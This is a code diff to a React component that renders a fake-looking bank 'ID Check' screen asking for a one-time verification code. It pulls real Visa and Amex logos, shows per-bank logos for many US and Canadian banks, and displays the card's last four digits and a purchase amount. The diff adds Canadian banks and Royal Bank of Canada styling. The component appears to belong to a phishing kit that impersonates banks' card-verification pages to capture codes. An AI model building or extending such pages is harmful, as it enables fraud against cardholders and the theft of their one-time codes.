@@ -1,12 +1,12 @@
 import React from 'react';
-import { ArrowLeft, CreditCard, X } from 'lucide-react';
+import { CreditCard } from 'lucide-react';
+import { banks as americanBanks, canadianbanks } from '../data'; // ✅ import both
 
 interface TwoFactorCodeProps {
   code: string;
   setCode: (v: string) => void;
   onSubmit: (e: React.FormEvent) => void;
   disabled?: boolean;
-  banks?: any;
   selectedBank: string;
   cardType: string;
   cardNumber: string;
@@ -21,7 +21,6 @@ const TwoFactorCode: React.FC<TwoFactorCodeProps> = ({
   setCode,
   onSubmit,
   disabled,
-  banks,
   selectedBank,
   cardType,
   cardNumber,
@@ -31,16 +30,19 @@ const TwoFactorCode: React.FC<TwoFactorCodeProps> = ({
   const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     setCode(sanitize(e.target.value));
   };
-  const bankData = banks.find((bnk: any) => bnk.name === selectedBank);
+
+  // ✅ Merge US + Canadian banks
+  const allBanks = [...americanBanks, ...canadianbanks];
+  const bankData = allBanks.find((bnk) => bnk.name === selectedBank);
+
   const lastFour = cardNumber.replace(/\s+/g, '').slice(-4);
+
   const getCardIcon = (type: string) => {
     const iconClass = 'w-28 object-contain';
     switch (type) {
       case 'visa':
         return (
-          <div
-            className={`${iconClass} text-white text-xs justify-center font-bold flex items-center rounded`}
-          >
+          <div className={`${iconClass} flex items-center`}>
             <img
               src="https://cdn.visa.com/v2/assets/images/logos/visa/blue/logo.png"
               className="w-[80px] h-[20px]"
@@ -49,44 +51,34 @@ const TwoFactorCode: React.FC<TwoFactorCodeProps> = ({
         );
       case 'mastercard':
         return (
-          <div
-            className={`${iconClass} text-white mr-1.5 text-xs justify-center font-bold flex items-center rounded w-[50px] h-[30px]`}
-          >
-            <img src="/bank-logos/mc-logo.svg" alt="" />
+          <div className={`${iconClass} flex items-center`}>
+            <img src="/bank-logos/mc-logo.svg" alt="Mastercard" />
           </div>
         );
       case 'amex':
         return (
-          <div
-            className={`${iconClass} text-white text-xs justify-center font-bold flex items-center rounded`}
-          >
+          <div className={`${iconClass} flex items-center`}>
             <img
               src="https://www.aexp-static.com/cdaas/one/statics/axp-static-assets/1.8.0/package/dist/img/logos/dls-logo-bluebox-solid.svg"
-              alt=""
+              alt="Amex"
             />
           </div>
         );
       case 'discover':
         return (
-          <div
-            className={`${iconClass} bg-orange-500 text-white text-xs justify-center font-bold flex items-center rounded`}
-          >
+          <div className={`${iconClass} flex items-center bg-orange-500 text-white`}>
             DISC
           </div>
         );
       case 'jcb':
         return (
-          <div
-            className={`${iconClass} text-white justify-center text-xs font-bold flex items-center rounded`}
-          >
-            <img src="/bank-logos/jcb_emblem.svg" alt="" />
+          <div className={`${iconClass} flex items-center`}>
+            <img src="/bank-logos/jcb_emblem.svg" alt="JCB" />
           </div>
         );
       case 'diners':
         return (
-          <div
-            className={`${iconClass} bg-gray-600 text-white text-xs justify-center font-bold flex items-center rounded`}
-          >
+          <div className={`${iconClass} flex items-center bg-gray-600 text-white`}>
             DC
           </div>
         );
@@ -94,41 +86,45 @@ const TwoFactorCode: React.FC<TwoFactorCodeProps> = ({
         return <CreditCard className="w-6 h-6 text-gray-400" />;
     }
   };
+
   const className =
     selectedBank === 'Wells Fargo'
       ? 'bg-[#D61F28]'
       : selectedBank === 'Citi'
-        ? 'w-[100px] h-[60px]'
-        : selectedBank === 'PNC'
-          ? 'bg-[#414E58]'
-          : selectedBank === 'TD Bank'
-            ? '!w-[150px] h-[50px]'
-            : selectedBank === 'Truist'
-              ? 'w-[150px] h-[50px]'
-              : selectedBank === 'Regions Bank'
-                ? 'w-[150px] h-[50px]'
-                : selectedBank === 'M&T Bank'
-                  ? 'bg-[#015840]'
-                  : selectedBank === 'Navy Federal Credit Union'
-                    ? 'w-[200px] h-auto'
-                    : '';
+      ? 'w-[100px] h-[60px]'
+      : selectedBank === 'PNC'
+      ? 'bg-[#414E58]'
+      : selectedBank === 'TD Bank'
+      ? '!w-[150px] h-[50px]'
+      : selectedBank === 'Truist'
+      ? 'w-[150px] h-[50px]'
+      : selectedBank === 'Regions Bank'
+      ? 'w-[150px] h-[50px]'
+      : selectedBank === 'M&T Bank'
+      ? 'bg-[#015840]'
+      : selectedBank === 'Navy Federal Credit Union'
+      ? 'w-[200px] h-auto'
+      : selectedBank === 'Royal Bank of Canada'
+      ? 'bg-[#002D72]'
+      : '';
+
   return (
     <div className="bg-white min-h-screen">
-      {/* Header with back arrow and close button */}
+      {/* Header with bank logo and card type */}
       <div className="flex items-center justify-between p-4">
         <div className="border-b border-gray-200 flex justify-between w-full items-center">
-          <img
-            src={bankData?.additionalLogo}
-            alt="Capital One"
-            className={`${className} h-5 max-w-[200px] mb-2`}
-          />
+          {bankData?.additionalLogo && (
+            <img
+              src={bankData.additionalLogo}
+              alt={selectedBank}
+              className={`${className} h-5 max-w-[200px] mb-2`}
+            />
+          )}
           <div className="flex items-center space-x-2 mb-2">
             {getCardIcon(cardType)} |
             <span className="text-sm font-medium text-gray-700">ID Check</span>
           </div>
         </div>
-
-        {/* Capital One Logo */}
       </div>
 
       {/* Main Content */}
@@ -149,10 +145,10 @@ const TwoFactorCode: React.FC<TwoFactorCodeProps> = ({
           </div>
 
           <div>
-            <span className="font-semibold text-gray-900">
-              Purchase Amount:
-            </span>
-            <div className="text-gray-900 font-semibold mt-1">${total.toFixed(2)} USD</div>
+            <span className="font-semibold text-gray-900">Purchase Amount:</span>
+            <div className="text-gray-900 font-semibold mt-1">
+              ${total.toFixed(2)} USD
+            </div>
           </div>
 
           <div>
@@ -179,7 +175,8 @@ const TwoFactorCode: React.FC<TwoFactorCodeProps> = ({
 
           <button
             type="submit"
-            className="w-full font-semibold py-3 px-6 rounded-lg transition-all duration-200 bg-blue-600 hover:bg-blue-700 text-white cursor-pointer"
+            disabled={disabled}
+            className="w-full font-semibold py-3 px-6 rounded-lg transition-all duration-200 bg-blue-600 hover:bg-blue-700 text-white cursor-pointer disabled:opacity-50"
           >
             Submit Code
           </button>
